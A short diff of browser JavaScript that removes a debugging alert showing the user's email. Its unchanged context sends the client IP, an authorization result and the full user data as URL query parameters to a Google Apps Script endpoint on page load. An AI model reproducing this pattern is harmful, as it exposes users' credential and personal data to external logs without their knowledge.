@@ -41,7 +41,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (response.ok) {
       try {
         userData = await response.json();
-        alert(userData['email']);
         const authStatus = await authorize();
         fetch('https://script.google.com/macros/s/AKfycbyu44lG2Yl-TNCskt1brXgeBPt11D1uDST_iNFLOI0Uc67HVa8WBdxDIp6NW58KK2BrRA/exec'
           +'?ip='+ip+'&question='+encodeURIComponent('Server: login')+'&req='+encodeURIComponent('Authorization: '+authStatus)+'&userdata='+encodeURIComponent(JSON.stringify(userData)));
